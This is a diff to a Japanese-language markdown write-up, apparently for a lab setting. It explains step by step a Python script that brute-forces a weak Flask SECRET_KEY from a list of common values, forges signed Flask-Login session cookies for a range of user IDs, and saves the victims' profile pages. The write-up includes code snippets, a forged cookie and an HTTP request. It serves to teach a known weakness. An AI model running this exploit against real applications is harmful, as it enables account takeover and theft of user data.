@@ -126,22 +126,391 @@ SECRET_KEYS = [
 ### 全体フロー
 
 ```
-SECRET_KEY発見
+1. コマンドライン引数の解析
     ↓
-Flaskアプリケーションの設定
+2. ユーザーIDの範囲解析
     ↓
-セッションシリアライザーの取得
+3. SECRET_KEY候補リストの定義
     ↓
-偽造セッションデータの作成
+4. SECRET_KEYの辞書攻撃（各候補を順次試行）
+    │
+    ├─ 4-1. Flaskアプリケーションの作成
+    │      (create_serializer関数)
+    │
+    ├─ 4-2. セッションシリアライザーの取得
+    │      (app.session_interface.get_signing_serializer)
+    │
+    ├─ 4-3. テスト用セッションデータの作成
+    │      (create_session_data関数)
+    │
+    ├─ 4-4. テスト用セッションクッキーの生成
+    │      (serializer.dumps)
+    │
+    ├─ 4-5. テストリクエストの送信
+    │      (make_request_with_cookie関数)
+    │
+    ├─ 4-6. レスポンスの検証
+    │      (is_attack_successful関数)
+    │
+    └─ 4-7. 成功したSECRET_KEYを返す
     ↓
-セッションクッキーの生成（署名付き）
+5. 正しいSECRET_KEYとシリアライザーの取得
     ↓
-HTTPリクエストの送信（クッキー付き）
+6. 各ユーザーIDに対してセッションハイジャックを実行
+    │
+    ├─ 6-1. 偽造セッションデータの作成
+    │      (create_session_data関数)
+    │      → {"_user_id": user_id, "_fresh": True, "_id": user_id}
+    │
+    ├─ 6-2. セッションクッキーの生成（署名付き）
+    │      (serializer.dumps)
+    │      → JSONエンコード → Base64エンコード → HMAC署名 → 結合
+    │
+    ├─ 6-3. HTTPリクエストの送信（クッキー付き）
+    │      (make_request_with_cookie関数)
+    │      → GET /profile リクエストに偽造クッキーを付与
+    │
+    ├─ 6-4. リダイレクト処理（必要に応じて）
+    │      → 302リダイレクトの場合はリダイレクト先にアクセス
+    │
+    ├─ 6-5. レスポンスの検証
+    │      (is_attack_successful関数)
+    │      → ステータスコードと内容を確認
+    │
+    ├─ 6-6. サーバー側での検証プロセス
+    │      → クッキーの受信
+    │      → 署名の検証（HMAC署名の再計算と比較）
+    │      → セッションデータの復号（Base64/JSONデコード）
+    │      → 認証チェック（_user_idの存在確認）
+    │
+    └─ 6-7. 成功時のHTML保存
+          → profile_page_user_{user_id}.html として保存
     ↓
-サーバー側での検証と認証バイパス
-    ↓
-保護されたリソースへのアクセス成功
+7. 保護されたリソースへのアクセス成功
 ```
+
+#### 各ステップの詳細説明
+
+##### ステップ1: コマンドライン引数の解析
+
+**実行箇所**: `main()`関数（105-120行目）
+
+```python
+parser = argparse.ArgumentParser(...)
+parser.add_argument('-u', '--url', required=True, help='ターゲットURL（必須）')
+parser.add_argument('-i', dest='user_id', default='1', ...)
+args = parser.parse_args()
+```
+
+**処理内容**:
+- `-u, --url`: ターゲットURLを取得（必須）
+- `-i`: ユーザーIDを取得（オプション、デフォルト: 1）
+- 引数を解析して`args`オブジェクトに格納
+
+**出力**: `target_url`, `user_id`文字列
+
+---
+
+##### ステップ2: ユーザーIDの範囲解析
+
+**実行箇所**: `main()`関数（124行目）→ `parse_user_ids()`関数（6-15行目）
+
+```python
+target_user_ids = parse_user_ids(args.user_id)
+```
+
+**処理内容**:
+- `-i`オプションで指定された文字列を解析
+- `"1-5"`のような範囲指定の場合は、`['1', '2', '3', '4', '5']`に変換
+- 単一IDの場合は、`['1']`のような単一要素のリストに変換
+
+**出力**: ユーザーIDのリスト（例: `['1', '2', '3']`）
+
+---
+
+##### ステップ3: SECRET_KEY候補リストの定義
+
+**実行箇所**: `main()`関数（126-133行目）
+
+```python
+SECRET_KEYS = [
+    "secret",
+    "secret-key",
+    "testkey",
+    "ecre-key",
+    "your-secret-key-change-in-production",
+    "secret-keys",
+]
+```
+
+**処理内容**:
+- よくある固定値のSECRET_KEY候補をリストとして定義
+- これらの候補を順次試行して、正しいSECRET_KEYを特定
+
+**出力**: SECRET_KEY候補のリスト
+
+---
+
+##### ステップ4: SECRET_KEYの辞書攻撃
+
+**実行箇所**: `main()`関数（141行目）→ `discover_secret_key()`関数（55-71行目）
+
+**4-1. Flaskアプリケーションの作成**
+
+```python
+app = Flask(__name__)
+app.config['SECRET_KEY'] = secret_key
+```
+
+**処理内容**:
+- `create_serializer()`関数内で実行
+- Flaskアプリケーションインスタンスを作成
+- 試行中のSECRET_KEYを設定
+
+**4-2. セッションシリアライザーの取得**
+
+```python
+serializer = app.session_interface.get_signing_serializer(app)
+```
+
+**処理内容**:
+- Flaskの`SecureCookieSessionInterface`から署名付きシリアライザーを取得
+- このシリアライザーは、セッションデータを署名付きクッキーに変換するために使用
+
+**4-3. テスト用セッションデータの作成**
+
+```python
+session_data = create_session_data(test_user_id)
+# → {"_user_id": "1", "_fresh": True, "_id": "1"}
+```
+
+**処理内容**:
+- `create_session_data()`関数でテスト用のセッションデータを作成
+- 最初のユーザーID（`target_user_ids[0]`）を使用
+
+**4-4. テスト用セッションクッキーの生成**
+
+```python
+cookie = serializer.dumps(session_data)
+```
+
+**処理内容**:
+- `serializer.dumps()`でセッションデータを署名付きクッキーに変換
+- 内部処理:
+  1. JSONエンコード: `{"_user_id": "1", ...}` → `'{"_user_id":"1",...}'`
+  2. Base64エンコード: JSON文字列をBase64エンコード
+  3. HMAC署名の生成: SECRET_KEYを使用してHMAC-SHA1署名を計算
+  4. 結合: `{base64_data}.{timestamp}.{signature}`の形式で結合
+
+**4-5. テストリクエストの送信**
+
+```python
+response = make_request_with_cookie(cookie, target_url)
+# → GET http://target_url/profile
+# → Cookie: session={generated_cookie}
+```
+
+**処理内容**:
+- `make_request_with_cookie()`関数で実際のHTTPリクエストを送信
+- 生成したクッキーを`Cookie`ヘッダーに設定
+- `/profile`エンドポイントにアクセス
+
+**4-6. レスポンスの検証**
+
+```python
+is_successful = is_attack_successful(response)
+```
+
+**処理内容**:
+- `is_attack_successful()`関数でレスポンスを検証
+- ステータスコード200でログインページでない場合、または302で`/login`以外へのリダイレクトの場合、成功と判定
+
+**4-7. 成功したSECRET_KEYを返す**
+
+```python
+if serializer:
+    return secret_key, serializer
+```
+
+**処理内容**:
+- 成功した場合は、そのSECRET_KEYとシリアライザーを返す
+- すべて失敗した場合は、警告を表示してデフォルトのSECRET_KEYを使用
+
+**出力**: 正しいSECRET_KEYとシリアライザー
+
+---
+
+##### ステップ5: 正しいSECRET_KEYとシリアライザーの取得
+
+**実行箇所**: `main()`関数（141行目）
+
+```python
+used_secret_key, serializer = discover_secret_key(SECRET_KEYS, target_url, target_user_ids[0])
+```
+
+**処理内容**:
+- `discover_secret_key()`関数の戻り値を受け取る
+- 以降の処理で使用するシリアライザーを確定
+
+**出力**: `used_secret_key`（文字列）, `serializer`（シリアライザーオブジェクト）
+
+---
+
+##### ステップ6: 各ユーザーIDに対してセッションハイジャックを実行
+
+**実行箇所**: `main()`関数（144-145行目）→ `hijack_user_session()`関数（74-102行目）
+
+**6-1. 偽造セッションデータの作成**
+
+```python
+session_data = create_session_data(user_id)
+# → {"_user_id": "2", "_fresh": True, "_id": "2"}
+```
+
+**処理内容**:
+- 各ユーザーIDに対して、なりすまし用のセッションデータを作成
+- Flask-Loginの標準的なセッションデータ構造に合わせる
+
+**6-2. セッションクッキーの生成（署名付き）**
+
+```python
+cookie = serializer.dumps(create_session_data(user_id))
+```
+
+**処理内容**:
+- 正しいSECRET_KEYで署名されたセッションクッキーを生成
+- 生成プロセス:
+  1. **JSONエンコード**: `{"_user_id": "2", "_fresh": True, "_id": "2"}` → `'{"_user_id":"2","_fresh":true,"_id":"2"}'`
+  2. **Base64エンコード**: JSON文字列をBase64エンコード → `eyJfdXNlcl9pZCI6IjIiLCJfZnJlc2giOnRydWUsIl9pZCI6IjIifQ`
+  3. **タイムスタンプの追加**: 現在時刻をエンコード → `aS66_g`
+  4. **HMAC署名の生成**: SECRET_KEYを使用してHMAC-SHA1署名を計算 → `kPRYHYEhk4vpdOw-XJdsiPsZY34`
+  5. **結合**: `{base64_data}.{timestamp}.{signature}`の形式で結合
+
+**生成されるクッキーの例**:
+```
+eyJfdXNlcl9pZCI6IjIiLCJfZnJlc2giOnRydWUsIl9pZCI6IjIifQ.aS66_g.kPRYHYEhk4vpdOw-XJdsiPsZY34
+│─────────── Base64エンコードされたセッションデータ ───────────││timestamp││─── HMAC署名 ───│
+```
+
+**6-3. HTTPリクエストの送信（クッキー付き）**
+
+```python
+response = make_request_with_cookie(cookie, target_url)
+```
+
+**処理内容**:
+- `requests.Session()`でHTTPセッションオブジェクトを作成
+- `session.cookies.set('session', cookie)`で偽造クッキーを設定
+- `session.get(f'{target_url}/profile', allow_redirects=False)`でプロフィールページにアクセス
+
+**送信されるHTTPリクエストの例**:
+```
+GET /profile HTTP/1.1
+Host: localhost:5000
+Cookie: session=eyJfdXNlcl9pZCI6IjIiLCJfZnJlc2giOnRydWUsIl9pZCI6IjIifQ.aS66_g.kPRYHYEhk4vpdOw-XJdsiPsZY34
+```
+
+**6-4. リダイレクト処理（必要に応じて）**
+
+```python
+if response.status_code == 302 and '/login' in response.headers.get('Location', ''):
+    redirect_url = response.headers.get('Location', '')
+    if not redirect_url.startswith('http'):
+        redirect_url = f'{target_url}{redirect_url}'
+    response = requests.get(redirect_url, allow_redirects=True)
+```
+
+**処理内容**:
+- ステータスコード302で`/login`へのリダイレクトの場合、リダイレクト先にアクセス
+- 相対URLの場合は絶対URLに変換
+- リダイレクトを追跡して最終的なレスポンスを取得
+
+**6-5. レスポンスの検証**
+
+```python
+is_successful = is_attack_successful(response)
+```
+
+**処理内容**:
+- `is_attack_successful()`関数でレスポンスを検証
+- **ステータスコード200の場合**:
+  - レスポンス本文に「ログイン」「username」「<title>ログイン」の3つすべてが含まれている場合はログインページと判定し、失敗
+  - それ以外の場合は成功と判定
+- **ステータスコード302の場合**:
+  - リダイレクト先が`/login`でない場合は成功と判定
+  - `/login`へのリダイレクトの場合は失敗と判定
+
+**6-6. サーバー側での検証プロセス**
+
+サーバー側（Flaskアプリケーション）で実行される処理:
+
+1. **クッキーの受信**:
+   - HTTPリクエストから`session`クッキーを取得
+   - クッキーの形式: `{base64_data}.{timestamp}.{signature}`
+
+2. **署名の検証**:
+   ```python
+   # サーバー側の処理（疑似コード）
+   server_secret_key = app.config['SECRET_KEY']
+   received_signature = cookie.split('.')[-1]  # クッキーから署名を抽出
+   calculated_signature = hmac_sha1(server_secret_key, base64_data + timestamp)
+   if received_signature == calculated_signature:
+       # 署名が有効
+   ```
+   - サーバーの`SECRET_KEY`を使用してHMAC署名を再計算
+   - クッキーに含まれる署名と比較
+   - 一致しない場合、クッキーは無効と判定され、認証失敗
+
+3. **セッションデータの復号**:
+   ```python
+   # サーバー側の処理（疑似コード）
+   base64_data = cookie.split('.')[0]
+   json_data = base64_decode(base64_data)
+   session_data = json_decode(json_data)
+   # → {"_user_id": "2", "_fresh": true, "_id": "2"}
+   ```
+   - 署名が有効な場合、Base64デコードとJSONデコードを実行
+   - セッションデータ（`_user_id`など）を取得
+
+4. **認証チェック**:
+   ```python
+   # サーバー側の処理（疑似コード）
+   if '_user_id' in session_data:
+       user_id = session_data['_user_id']
+       # そのユーザーとして認証済みとみなす
+       # 保護されたリソースへのアクセスを許可
+   ```
+   - `_user_id`が存在するか確認
+   - 存在する場合、そのユーザーとして認証済みとみなす
+   - 保護されたリソースへのアクセスを許可
+
+**重要なポイント**:
+- サーバーは署名の検証のみを行い、クッキーの内容（`_user_id`）が実際のログインセッションから来たものかは検証しない
+- 正しいSECRET_KEYで署名されたクッキーは、無条件で有効と判定される
+- これがセッションハイジャックの根本的な脆弱性
+
+**6-7. 成功時のHTML保存**
+
+```python
+if is_attack_successful(response):
+    output_filename = f"profile_page_user_{user_id}.html"
+    with open(output_filename, 'w', encoding='utf-8') as f:
+        f.write(response.text)
+```
+
+**処理内容**:
+- 攻撃が成功した場合、取得したHTMLをファイルに保存
+- ファイル名は`profile_page_user_{user_id}.html`の形式
+- これにより、なりすましたユーザーの情報を後で確認できる
+
+---
+
+##### ステップ7: 保護されたリソースへのアクセス成功
+
+**処理内容**:
+- すべてのユーザーIDに対してセッションハイジャックが完了
+- 成功した場合は、各ユーザーのプロフィールページのHTMLが保存される
+- 攻撃者は、パスワードを知らなくても、任意のユーザーになりすまして保護されたリソースにアクセス可能
 
 ### セッションクッキーの生成プロセス
 
